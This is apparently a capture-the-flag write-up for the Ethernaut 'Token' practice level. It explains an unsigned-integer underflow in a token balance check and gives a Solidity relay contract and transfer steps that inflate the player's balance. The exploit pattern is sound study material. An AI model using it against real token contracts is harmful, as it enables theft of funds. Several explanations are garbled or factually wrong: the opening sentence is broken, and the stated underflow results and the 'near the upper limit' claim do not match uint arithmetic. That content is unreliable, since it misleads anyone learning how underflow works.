# [5. Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

This attack makes use of the integer overflow or integer underflow exploit. In fact, the statement `require(balances[msg.sender] - _value >= 0);` because the calculation is happening on unsigned integers! Of course, they will always be greater than or equal to 0. Here too we needed a buddy to help us, which is the contract below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Token {
  function transfer(address _to, uint _value) external returns (bool);
}

contract Attacker {
  Token tokenTarget;

  constructor(address _target) {
    tokenTarget = Token(_target);
  }

  function transfer(address _to, uint _value) external returns (bool) {
    return tokenTarget.transfer(_to, _value);
  }
}
```

The steps are simple:

1. We start with 20 tokens, as the task described. We send an arbitrary amount of (lets say 4) tokens to the Attacker contract.
    - Player has 16 tokens
    - Attacker has 4 tokens
2. We can now send from Attacker to the Player a HUGE amount of tokens, I sent 67108842. It is important to note that this value is a bit smaller than the upper-limit to avoid overflowing back.
    - Player has 67108858 tokens. This is equal to (16 + 67108842).
    - Attacker has 26 tokens. This is equal to (4 - 67108842) underflowed.

Why did we need the buddy attacker? In the code, you can see that the following two lines cancel eachother out if both `msg.sender` and `_to` are the same:

```solidity
balances[msg.sender] -= _value;
balances[_to] += _value;
```
